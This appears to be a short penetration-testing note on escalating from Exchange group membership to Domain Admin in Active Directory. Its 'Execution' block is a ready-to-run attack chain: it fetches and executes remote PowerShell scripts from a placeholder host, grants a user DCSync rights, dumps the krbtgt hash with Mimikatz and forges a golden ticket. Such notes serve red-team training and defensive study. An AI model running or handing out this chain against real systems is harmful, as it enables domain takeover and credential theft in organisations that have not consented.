# Exchange Servers privilege escalation
Exchange Servers by default are configured with high privilege permission, all the members of Exchange Group allowing to write access to the Domain Object in Active Directory. Access to Domain Object enables the user to modify domain privileges which could allow for privilege escalation. In the context of any compromised email account on the network,
an attacker may be able to gain access to the Domain Admin account.

### TO Hunt Down Which Group is being permitted the modify permission and Write permission
```
Invoke-ACLScanner | Format-Table ObjectDN,AceQualifier,IdentityReferenceName,ActiveDirectoryRights
Get-NetGroup "Exchange Windows Permissions"
```
![ high privilege permission](https://github.com/NyaMeeEain/Infrastructure-Assessment/blob/master/Lateral%20Movement/Images/Exchange-Permissions.PNG)

### Execution
```
iex (New-Object Net.WebClient).DownloadString('http://x.x.x.x/Import-ActiveDirectory.ps1');Import-ActiveDirectory
iex (New-Object Net.WebClient).DownloadString('http://x.x.x.x/RACE.ps1')
Add-ADGroupMember -Identity 'Exchange Windows Permissions' -Members John -Verbose 
Set-ADACL -DistinguishedName 'DC=insomnia,DC=io' -SamAccountName John -GUIDRight DCSync #add DCSync permissions
Invoke-Mimikatz -Command '"lsadump::dcsync /user:ins0mnia\krbtgt"'

Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<> /sid:<> /krbtgt:<> /ptt"'
```
![Exchange-Priv](https://github.com/NyaMeeEain/Infrastructure-Assessment/blob/master/Images/Exchange-Priv.PNG)
